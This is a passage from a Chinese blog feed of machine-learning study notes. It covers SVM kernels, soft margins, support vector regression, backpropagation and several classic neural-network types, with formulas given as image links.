<h3 id="核技巧-kernel-trick"><a href="#核技巧-kernel-trick" class="headerlink" title="核技巧(kernel trick)"></a>核技巧(kernel trick)</h3><p>求解上式涉及到计算Φ(xi)TΦ(xj)， 这是样本Xi与Xj映射到特征空间之后的内积.由于特征空间维数可能很高，因此直接计算Φ(xi)TΦ(xj)通常是复杂困难的.为了避开这个障碍，可以设想这样一个函数:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式622.png" style="zoom:100%;">

<p>即Xi与Xj在特征空间的内积等于它们在原始样本空间中通过函数κ(. , .)计算的结果.有了这样的函数,我们就不必直接去计算高维甚至无穷维特征空间中的内积,（这就称为核技巧），于是：(6.24)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式623.png" style="zoom:100%;">

<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式624.png" style="zoom:100%;">

<p>这里的函数κ(. ， .)就是”核函数” (kernel function) .模型最优解可通过训练样本的核函数展开，这一展式亦称”支持向量展式”(support vector expansion).</p>
<h3 id="核函数-1"><a href="#核函数-1" class="headerlink" title="核函数"></a>核函数</h3><p>令χ为输入空间，κ(.,.) 是定义在 χ*χ 上的对称函数，则κ是核函数当且仅当对于任意数据D = {x1,…,xm} ，”核矩阵” (kernel matrix) K 总是半正定的:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/核矩阵.png" style="zoom:100%;">

<p>只要一个对称函数所对应的核矩阵半正定，它就能作为核函数使用.事实上，对于一个半正定核矩阵，总能找到一个与之对应的映射Φ.</p>
<p>我们希望样本在特征空间内线性可分，因此特征空间的好坏对支持向量机的性能至关重要.需注意的是，在不知道特征映射的形式时，我们并不知道什么样的核函数是合适的，而核函数也仅是隐式地定义了这个特征空间.于是，”核函数选择”成为支持向量机的最大变数.若核函数选择不合适，则意味着将样本映射到了一个不合适的特征空间，很可能导致性能不佳.</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/常用核函数.png" style="zoom:100%;">

<p>此外，核函数还可通过多个函数组合得到</p>
<h2 id="软间隔与正则化"><a href="#软间隔与正则化" class="headerlink" title="软间隔与正则化"></a>软间隔与正则化</h2><h3 id="软间隔与硬间隔"><a href="#软间隔与硬间隔" class="headerlink" title="软间隔与硬间隔"></a>软间隔与硬间隔</h3><p>在现实任务中，往往很难确定合适的核函数使得训练样本在特征空间中线性可分，即使恰好找到了某个核函数使训练集在特征空间中线性可分，也很难断定这个貌似线性可分的结果不是由于过拟合所造成的.</p>
<p>缓解该问题的一个办法是允许支持向量机在一些样本上出错.为此，要引入”软间隔” (soft margin) 的概念:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/软间隔.png" style="zoom:100%;">

<p>硬间隔 (hard margin) ：所有样本都必须划分正确(之前所推导的都是硬间隔)<br>软间隔：允许某些样本不满足约束(6.28)： (如上图中的红点)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式628.png" style="zoom:100%;">

<p>在最大化间隔的同时，不满足约束的样本应尽可能少。于是，优化目标可写为：(6.29)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式629.png" style="zoom:100%;">

<p>其中C&gt;0 是一个常数， l （lost01）是”0/1损失函数” :</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式630.png" style="zoom:100%;">

<blockquote>
<p>当C为无穷大时，式(6.29)迫使所有样本均满足约束(6.28) ，于是式(6.29) 等价于(6.6)(硬间隔);<br>当C取有限值时，式(6.29)允许一些样本不满足约束.</p>
</blockquote>
<p>然而上式l非凸、非连续，数学性质不太好，使得式(6.29)不易直接求解.于是，人们通常用其他一些函数来代替l(0/1) ， 称为”替代损失” (surrogate loss).替代损失函数一般具有较好的数学性质，如它们通常是凸的连续函数且是l(0/1)的上界.三种常用的替代损失函数:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/替代损失函数.png" style="zoom:100%;">

<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/替代损失函数图.png" style="zoom:70%;">

<p>例如，若采用hinge 损失，则式(6.29)变成：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式634.png" style="zoom:100%;">

<p>引入”松弛变量” (slack variabies) ξi&gt;=0 可将式重写为:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式635.png" style="zoom:100%;">

<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式6352.png" style="zoom:100%;">

<p>这就是常用的”软间隔支持向量机”</p>
<p>类似于前面，使用拉格朗日乘子法得到拉格朗日函数，令函数对ω、b、ξ(多了个ξ)求偏导并令为0，再代回式子，即得到对偶问题，然后用上面同样的SMO算法即可得到支持向量展开式</p>
<blockquote>
<p>由于使用软间隔支持向量机，其不要求所有样本都满足约束，因此其KKT条件：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/641.png" style="zoom:100%;">
</blockquote>
<h3 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h3><p>我们还可以把式(6.29) 中的l(0/1)损失函数换成别的替代损失函数以得到其他学习模型，这些模型的性质与所用的替代函数直接相关，但它们具有一个共性:优化目标中的第一项用来描述划分超平面的”间隔”大小，后面一项用来表述训练集上的误差，可写为更一般的形式：(6.42)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/642.png" style="zoom:100%;">

<p>其中。第一项Ω(f) 称为”结构风险” (structural risk) ，用于描述模型f的某些性质(间隔);<br>第二项称为”经验风险” (empirical risk) ，用于描述模型与训练数据的契合程度;<br>C用于对二者进行折中.</p>
<p>从经验风险最小化的角度来看，Ω(f)表述了我们希望获得具有何种性质的模型(例如希望获得复杂度较小的模型)<br>另一方面，利用经验风险最小化，有助于削减假设空间，从而降低了最小化训练误差的过拟合风险.</p>
<p>从这个角度来说，式(6.42) 称为”正则化” (regularization) 问题，Ω(f) 称为正则化项， C则称为正则化常数.</p>
<blockquote>
<p>正则化可理解为一种”罚函数法”，即对不希望得到的结果采施以惩罚，从而使得优化过程趋向于希望目标.</p>
<p>Lp 范数(norm) 是常用的正则化项，<br>其中L2 范数IlωIl2 倾向于ω的分量取值尽量均衡，即非零分量个数尽量稠密<br>而Lo范数Ilwllo 和L1范数Ilwll1则倾向于ω 的分量尽量稀疏，即非零分量个数尽量少.</p>
</blockquote>
<h2 id="支持向量回归"><a href="#支持向量回归" class="headerlink" title="支持向量回归"></a>支持向量回归</h2><p><strong>支持向量回归(Support Vector Regression，SVR)</strong></p>
<p>前面讨论的是分类问题，下面讨论回归问题。</p>
<p>给定训练样本D = {(X1, Y1) , (X2，Y2),…,(Xm, Ym)}, 希望学得一个形如式(6.7) ：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/超平面模型.png" style="zoom:100%;">

<p>的回归模型，使得f(x)与y尽可能接近， ω 和b是待确定的模型参数.</p>
<p>对样本(X,Y)，传统回归模型通常直接基于模型输出f(x)与真实输出y之间的差别来计算损失，当且仅当f(x)与y完全相同时，损失才为零.</p>
<p>与此不同，支持向量回归(Support Vector Regression，简称SVR)假设我们能容忍f(x)与y之间最多有ε的偏差，即仅当f(x) 与y之间的差别绝对值大于ε时才计算损失.如下图所示，这相当于以f(x) 为中心，构建了一个宽度为2ε的间隔带，若训练样本落入此间隔带，则认为是被预测正确的.</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/支持向量回归.png" style="zoom:100%;">

<p>于是， SVR 问题可形式化为：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/643.png" style="zoom:100%;">

<p>其中C为正则化常数，l是ε不敏感损失(ε insensitive loss) 函数</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/644.png" style="zoom:100%;">

<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/不敏感损失函数.png" style="zoom:100%;">

<p>引入松弛变量ξ(可以有一些样本点不满足约束) (间隔带两侧的松弛程度可有所不同)，可将式重写为:</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/645.png" style="zoom:100%;">

<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/6452.png" style="zoom:100%;">

<p>其求解过程也是跟前面一样的：</p>
<p>引入拉格朗日乘子α1(上侧)、α2(下侧)、μ1、μ2，由拉格朗日乘子法：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/646.png" style="zoom:100%;">

<p>令拉格朗日函数对ω、b、ξ求偏导并为零：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/647.png" style="zoom:100%;">

<p>代回拉格朗日函数中，得到SVR的对偶问题：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/651.png" style="zoom:100%;">

<p>上述过程中需满足KKT条件：(6.52)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/652.png" style="zoom:100%;">

<p>可以看出，当且仅当f(Xi) -yi -ε-ξi = 0 时α能取非零值，2式同理，换言之，仅当样本(Xi ， Yi) 不落入ε间隔带中相应的α才能取非零值.</p>
<p>此外，由于约束f(Xi) -yi -ε-ξi = 0 、f(Xi) -yi -ε-ξi拔= 0 无法同时成立(因为不可能同时在上边界又在下边界)，因此两个α至少有一个为零</p>
<blockquote>
<p>落在ε-间隔带中的样本都满足αi = 0 且αi拔=0</p>
</blockquote>
<p>最终解得SVR解：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/653.png" style="zoom:100%;">

<p>能使式中的αi拔-αi ≠ 0的样本即为SVR的支持向量，它们必落在ε间隔带之外.显然，SVR的支持向量仅是训练样本的一部分</p>
<p>对b的求解：</p>
<p>由KKT 条件(6.52) 可看出，对每个样本(Xi，Yi) 都有 (C-αi)ξi=0 且 αi( f(xi) -yi -ε -ξi) =0 ，因此，在得到αi后，对任意一个样本的αi，若0&lt;αi&lt;C ，则必有ξi=0，进而有：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/654.png" style="zoom:100%;">

<p>因此，在求解到αi后，理论上可以使用任意一个满足0&lt;αi&lt;C的αi来对b进行求解。实际中，使用多个或所有的满足条件0&lt;αi&lt;C的αi对b进行求解然后求平均值</p>
<p>最后，对于ω，若再加以考虑核函数的映射，则对前面的拉格朗日求偏导得零处，可改为：</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/655.png" style="zoom:100%;">

<p>最后得SVR模型：(6.56)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/656.png" style="zoom:100%;">

<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>分类问题：(SVM 6.24)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/式624.png" style="zoom:100%;">

<p>回归问题：(SVR 6.56)</p>
<img src="/2020/02/25/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA/656.png" style="zoom:100%;">







]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>神经网络</title>
    <url>/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<h2 id="神经元模型"><a href="#神经元模型" class="headerlink" title="神经元模型"></a>神经元模型</h2><img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/神经元模型.png" style="zoom:100%;">

<p>上图为”M-P 神经元模型” [McCulloch and Pitts, 1943] 。</p>
<p>神经元接收到来自n个其他神经元传递过来的输入信号，这些输入信号通过带权重的连接(connection)进行传递，神经元接收到的总输入值将与神经元的阀值进行比较，然后通过”激活函数” (activation function) 处理以产生神经元的输出.</p>
<p>理想中的激活函数是阶跃函数，但阶跃函数具有不连续、不光滑等不太好的性质，因此实际常用Sigmoid函数作为激活函数（有时也称为”挤压函数” (squashing function）)，对数几率函数时Sigmoid函数的代表。(见前面线性模型中谈到的对数几率回归)</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/激活函数.png" style="zoom:100%;">

<p>把许多个这样的神经元按一定的层次结构连接起来，就得到了神经网络.</p>
<h2 id="感知机与多层网络"><a href="#感知机与多层网络" class="headerlink" title="感知机与多层网络"></a>感知机与多层网络</h2><img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/感知机网络结构.png" style="zoom:100%;">

<p>y = f(Σωixi - θ) ;一般地，给定训练数据集权重ωi(i=1,2,…,n) 以及阔值θ。可通过学习得到.这样，权重和阈值的学习就可统一为权重的学习.感知机学习规则非常简单，对训练样例（x,y) ，若当前感知机的输出为y拔， 则感知机权重将这样调整:</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/感知机权重调整.png" style="zoom:100%;">

<p>其中 0&lt;n&lt;1 ，称为学习率(learning rate)。可看出，若感知机对训练样例(x,y) 预测正确，即y拔 = y ， 则感知机不发生变化，否则将根据错误的程度进行权重调整.</p>
<p>若两类模式是线性可分的，即存在一个线性超平面能将它们分开。”非线性可分”意味着用线性起平面无法划分。与或非问题时线性可分的，而异或是非线性可分的。在非线性可分问题中，单层感知机学习过程将会发生震荡(fluctuation) ,ω难以稳定下来，不能求得合适解，例如单层感知机不能解决异或这样简单的非线性可分问题.</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/与或非异或.png" style="zoom:100%;">

<p>要解决非线性可分问题，需考虑多层功能神经元. 例如下图中这个简单的两层感知机就能解决异或问题.  输出层与输入层之间的一层神经元，被称为隐层或隐含层(hidden layer) ，隐含层和输出层神经元都是拥有激活函数的功能神经元.</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/两层感知机.png" style="zoom:100%;">

<p>更一般的，常见的神经网络是形如下图所示的层级结构，每层神经元与下层神经元全互连，神经元之间不存在同层连接， 也不存在跨层连接. 这样的神经网络结构通常称为” 多层前馈神经网络” (multi-layer feedforward neural networks) ，（”前债”并不意味着网络中信号不能向后传，而是指网络拓扑结构上不存在环或回路）其中输入层神经元接收外界输入，隐层与输出层神经元对信号进行加工。输入层神经元仅是接受输入，不进行函数处理。</p>
<p>神经网络的学习过程，就是根据训练数据来调整神经元之间的”连接权” (connection weight) 以及每个功能神经元的阈值;换言之，神经网络”学”到的东西，蕴涵在连接权与阈值中。</p>
<h2 id="误差逆传播算法"><a href="#误差逆传播算法" class="headerlink" title="误差逆传播算法"></a>误差逆传播算法</h2><p>欲训练多层网络，需要更强大的学习算法，如误差逆传播(errorBackPropagation，简称BP)算法。BP 算法不仅可用于多层前馈神经网络，还可用于其他类型的神经网络例如训练递归神经网络[1987].</p>
<p>假定：拥有d 个输入神经元、l 个输出神经元、q 个隐层神经元的多层前馈网络结构，其中输出层第j个神经元的阀值用θj 表示，隐层第h个神经元的阔值用γh 表示.输入层第i个神经元与隐层第h个神经元之间的连接权为νih，隐层第h个神经元与输出层第j个神经元之间的连接权为ωhj. 记隐层第h个神经元接收到的输入为: </p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/隐含层接收.png" style="zoom:100%;">

<p>输出层第j个神经元接收到的输入为:(其中bh 为隐层第h个神经元的输出)</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/输出层接收.png" style="zoom:100%;">

<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/BP网络.png" style="zoom:100%;">

<p>网络中有(d+ l +1) q + l 个参数需确定:输入层到隐层的dxq个权值、隐层到输出层的q x l 个权值、q 个隐层神经元的阔值、l个输出层神经元的阔值. BP 是一个迭代学习算法，在迭代的每一轮中采用广义的感知机学习规则对参数进行更新估计</p>
<p>BP 算法基于梯度下降(gradient descent)策略， 以目标的负梯度方向对参数进行调整.</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/BP1.jpg" style="zoom:50%;">

<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/BP2.jpg" style="zoom:50%;">

<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/BP3.jpg" style="zoom:50%;">

<p>学习率 0&lt;η&lt;1 控制着每一轮迭代中的更新步长,太大则容易振荡，太小则收敛速度又会过慢，常设置为η=0.1 。 有时为了做精细调节，可使每层神经元使用不同的学习率。</p>
<p>BP算法的工作流程：对每个训练样例，BP 算法执行以下操作:<br>先将输入示例提供给输入层神经元，然后逐层将信号前传，直到产生输出层的结果;然后计算输出层的误差(第4-5行) ，再将误差逆向传播至隐层神经元(第6 行) ，最后根据隐层神经元的误差来别连接权和阈值进行调整(第7行).该法代过程循环进行，直到达到某些停止条件为止，比如误差已经很小，或迭代次数达到上限。</p>
<a id="more"></a>

<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/BP算法.png" style="zoom:100%;">

<p>上面介绍的”标准BP算法”每次仅针对一个训练样例更新连接权和阈值，即根据单个Ek推导每次的更新。</p>
<p>BP算法的最终目标是最小化整个训练集的累计误差：</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/累计误差.png" style="zoom:100%;">

<h3 id="累积BP算法"><a href="#累积BP算法" class="headerlink" title="累积BP算法"></a>累积BP算法</h3><p>类似于上面的标准BP算法，推导出基于累积误差最小化的更新规则，就得到了累积误差逆传播(accumulated error backpropagation)算法，累积BP算法与标准BP算法都很常用。</p>
<p>一般来说，标准BP算法每次更新只针对单个样例，参数更新得非常频繁，而且对不同样例进行更新的效果可能出现”抵消”现象.因此，为了达到同样的累积误差极小点，标准BP 算法往往需进行更多次数的法代.累积BP算法直接针对累积误差最小化，它在读取整个训练集D一遍后才对参数进行更新，(读取训练集一遍称为进行了”一轮” 学习)其参数更新的频率低得多.但在很多任务中，累积误差下降到一定程度之后，进一步下降会非常缓慢，这时标准BP往往会更快获得较好的解，尤其是在训练集D非常大时更明显.</p>
<h3 id="再谈梯度下降"><a href="#再谈梯度下降" class="headerlink" title="再谈梯度下降"></a>再谈梯度下降</h3><p>标准BP算法和累积BP算法的区别类似于随机梯度下降(stochastic gradient descent，简称SGD)与标准梯度下降之间的区别.随机梯度下降是每次迭代使用一个样本来对参数进行更新，使得训练速度加快。而批量梯度下降（Batch Gradient Descent ， BGD在每一次迭代时使用所有样本来进行梯度的更新。 从迭代的次数上来看，SGD迭代的次数较多，在解空间的搜索过程看起来很盲目，但收敛速度更快。</p>
<h3 id="过拟合问题"><a href="#过拟合问题" class="headerlink" title="过拟合问题"></a>过拟合问题</h3><p>由于BP神经网络强大的表示能力， BP神经网络经常遭遇过拟合。有两种策略常用来缓解BP 网络的过拟合.<br>第一种策略是”早停” (early stopping): 将数据分成训练集和验证集，训练、集用来计算梯度、更新连接权和阔值，验证集用来估计误差，若训练集误差降低但验证集误差升高，则停止训练，同时返回具有最小验证集误差的连接权和阈值.(这与前面提到的决策树剪枝有一点类似)<br>第二种策略是”正则化” (regularization)，其基本思想是在误差目标函数中增加一个用于描述网络复杂度的部分，例如连接权与阔值的平方和.仍令Ek 表示第k个训练样例上的误差，ωi表示连接权和阈值，则误差目标函数E改进为:</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/引入正则项的误差目标函数.png" style="zoom:100%;">

<p>其中 0&lt;λ&lt;1用于对经验误差与网络复杂度这两项进行折中，常通过交叉验证法来估计.</p>
<h2 id="全局最小与局部极小"><a href="#全局最小与局部极小" class="headerlink" title="全局最小与局部极小"></a>全局最小与局部极小</h2><p>我们常会谈到两种”最优”：”局部极小” (local minimum)和”全局最小” (global minimum). 对ω* 和θ*，若存在ε&gt;0 使得：</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/最优参数.png" style="zoom:100%;">

<p>都有E(ω ; θ) &gt;=  E(ω* ; θ* )成立，则(ω* ; 0* ) 为局部极小解;</p>
<p>若对参数空间中，任意(ω ; θ)，都有E(ω ; θ) &gt;=  E(ω* ; θ* )成立，则(ω* ; 0* ) 为全局最小解.</p>
<p>参数空间内梯度为零的点，只要其误差函数值小于邻点的误差函数值，就是局部极小点;可能存在多个局部极小值，但却只会有一个全局最小值.，我们在参数寻优过程中是希望找到全局最小.</p>
<p>基于梯度的搜索足使用最为广泛的参数寻优方法.在此类方法中，我们从某些初始解出发，迭代寻找最优参数值.每次迭代中，我们先计算误差函数在当前点的梯度，然后根据梯度确定搜索方向.由于负梯度方向是函数值下降最快的方向，因此梯度下降法就是沿着负梯度方向搜索最优解。若误差函数在当前点的梯度为零，则已达到局部极小，更新量将为零，这意味着参数的迭代更新将在此停止。若此极小值是陷入了局部极小， 这不是我们所希望的.</p>
<p>在现实任务中，人们常采用以下策略来试图”跳出”局部极小，从而进一步接近全局最小：<br>(1)以多组不同参数值初始化多个神经网络7 按标准方法训练后，取其中误差最小的解作为最终参数.这相当于从多个不同的初始点开始搜索， 这样就可能陷入不同的局部极小从中进行选择有可能获得更接近全局最小的结果.<br>(2)使用”模拟退火” (simulated annealing) 技术[Aarts and Korst, 1989].模拟退火在每一步都以二定的概率接受比当前解更差的结果，从而有助于”跳出”局部极小. 在每步迭代过程中，接受”次优解”的概率要随着时间的推移而逐渐降低从而保证算法稳定.(但是存在造成”跳出”全局最小的可能性)<br>(3)使用随机梯度下降.与标准梯度下降法精确计算梯度不同， 随机梯度下降法在计算梯度时加入了随机因素.于是即便陷入局部极小点，它计算出的梯度仍可能不为零，这样就有机会跳出局部极小继续搜索.</p>
<h2 id="其它常见神经网络概述"><a href="#其它常见神经网络概述" class="headerlink" title="其它常见神经网络概述"></a>其它常见神经网络概述</h2><h3 id="RBF网络"><a href="#RBF网络" class="headerlink" title="RBF网络"></a>RBF网络</h3><p>RBF(Radial Basis Function，径向基函数)网络[1988] 是一种单隐层前馈神经网络，它使用径向基函数作为隐层神经元激活函数，而输出层则是对隐层神经元输出的线性组合.假定输入为d维向量风输出为实值，则RBF网络可表示为：</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/RBF1.png" style="zoom:100%;">

<p>其中q为隐层神经元个数， Ci 和Wi 分别是第i个隐层神经元所对应的中心和权重， ρ(x,Ci) 是径向基函数，这是某种沿径向对称的标量函数，通常定义为样本x到数据中心Ci之间欧氏距离的单调函数。常用的高斯径向基函数形如:</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/RBF2.png" style="zoom:100%;">

<p>通常采用两步过程来训练RBF网络:<br>第一步，确定神经元中心Ci ，常用的方式包括随机采样、聚类等;<br>第二步，利用BP算法等来确定参数ωi和βi.</p>
<h3 id="ART网络"><a href="#ART网络" class="headerlink" title="ART网络"></a>ART网络</h3><p>竞争型学习(competitive learning) 是神经网络中一种常用的无监督学习策略，在使用该策略时，网络的输出神经元相互竞争，每一时刻仅有一个竞争获胜的神经元被激活，其他神经元的状态被抑制.这种机制亦称”胜者通吃” (winner-take-all) 原则.</p>
<p>ART(Adaptive Resonance Theory，自适应谐振理论)网络是竞争型学习的重要代表.该网络由比较层、识别层、识别阈值和重置模块构成.其中比较层负责接收输入样本，并将其传递给识别层神经元.识别层每个神经元对应1个模式类，神经元数目可在训练过程中动态增长以增加新的模式类.</p>
<p>在接收到比较层的输入信号后识别层神经元之间相互竞争以产生获胜神经元。经元.竞争的最简单力自式是计算输入向量与每个识别层神经元所对应的模式类的代表向量之间的距离，距离最小者胜.获胜神经元将向其他识别层神经元发送信号，抑制其撤活.若输入向量与获胜神经元所对应的代表向量之间的相似度大于识别阈值，则当前输入样本将被归为该代表向量所属类别，同时，网络连接权将会更新，使得以后在接收到相似输入样本时该模式类会计算出更大的相似度，从而使该获胜神经元有更大可能获胜;若相似度不大于识别阈值，则重置模块将在识别层增设一个新的神经元，其代表向量就设置为当前输入向量.</p>
<p>识别阙值对ART 网络的性能有重要影响.当识别阔值较高时，输入样本将会被分成比较多、比较精细的模式类，而如果识别阈值较低，则会产生比较少、比较粗略的模式类。</p>
<p>ART 比较好地缓解了竞争型学习中的”可塑性-稳定性窘境” (stability plasticity dilemma) ，可塑性是指神经网络要有学习新知识的能力，而稳定性则是指神经网络在学习新知识时要保持对旧知识的记忆.这就使得ART 网络具有一个很重要的优点:可进行增量学习(incremental learning)或在线学习(online learning).</p>
<h3 id="SOM网络"><a href="#SOM网络" class="headerlink" title="SOM网络"></a>SOM网络</h3><p>SOM(Self-Organizing Map ，自组织映射)网络是一种竞争学习型的无监督神经网络。它能将高维输入数据映射到低维空间(通常为二维) ，同时保持输入数据在高维空间的拓扑结构，即将高维空间中相似的样本点映射到网络输出层中的邻近神经元.</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/SOM.png" style="zoom:100%;">

<p>SOM网络中的输出层神经元以矩阵方式排列在二维空间中，每个神经元都拥有一个权向量，网络在接收输入向量后，将会确定输出层获胜神经元，它决定了该输入向量在低维空间中的位置. SOM 的训练目标就是为每个输出层神经元找到合适的权向量，以达到保持拓扑结构的目的.</p>
<p>SOM 的训练过程:在接收到一个训练样本后.每个输出层神经局会计算该样本与自身携带的权向量之间的距离，距离最近的神经元成为竞争获胜者，称为最佳匹配单元 (best matching unit). 然后，最佳匹配单元及其邻近神经元的权向量将被调整，以使得这些权向量与当前输入样本的距离缩小.这个过程不断迭代，直至收敛.</p>
<h3 id="级联相关神经网络"><a href="#级联相关神经网络" class="headerlink" title="级联相关神经网络"></a>级联相关神经网络</h3><p>级联相关网络有两个主要成分”级联”和”相关” 级联是指建立层次连接的层级结构.在开始训练时，网络只有输入层和输出层，处于最小拓扑结构;随着训练的进行，如下图所示，新的隐层神经元逐渐加入，从而创建起层级结构. 当新的隐层神经元加入时，其输入端连接权值是冻结固定的。相关是指通过最大化新神经元的输出与网络误差之间的相关性(correlation)来训练相关的参数.</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/级联相关神经网络.png" style="zoom:100%;">

<p>级联相关网络的训练过程：新的隐结点加入时，红色连接权通过最大化新结点的输出与网络误差之间的相关性来进行训练.</p>
<p>级联相关(Cascade-Correlation) 网络是结构自适应网络的重要代表，它的网络结构不是事先固定的，而是在训练的过程中学习的。</p>
<h3 id="Elman网络"><a href="#Elman网络" class="headerlink" title="Elman网络"></a>Elman网络</h3><p>与前馈神经网络不同，”递归神经网络” (recurrent neural networks) 允许网络中出现环形结构，从而可让一些神经元的输出反馈回来作为输入信号.这样的结构与信息反馈过程，使得网络在t 时刻的输出状态不仅与t时刻的输入<br>有关，还与t -1时刻的网络状态有关，从而能处理与时间有关的动态变化.</p>
<p>Elman 网络是最常用的递归神经网络之一，其结构如下图所示，它的结构与多层前馈网络很相似，但隐层神经元的输出被反馈回来，与下一时刻输入层神经元提供的信号一起，作为隐层神经元在下一时刻的输入.隐含层神经元通常采用Sigmoid激活函数，而网络的训练则常通过推广的BP 算法进行.</p>
<img src="/2020/02/20/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/Elman.png" style="zoom:100%;">

<h2 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h2><p>理论上来说，参数越多的模型复杂度越高、”容量” (capacity)越大，这意味着它能完成更复杂的学习任务.但一般情形下，复杂模型的训练效率低，易陷入过拟合。但随着云计算、大数据时代的到来，计算能力的大幅提高可缓解训练低效性，训练数据的大幅增加则可降低过拟合风险，因此，以”深度学习” (deep learning) 为代表的复杂模型开始受到人们的关注.</p>
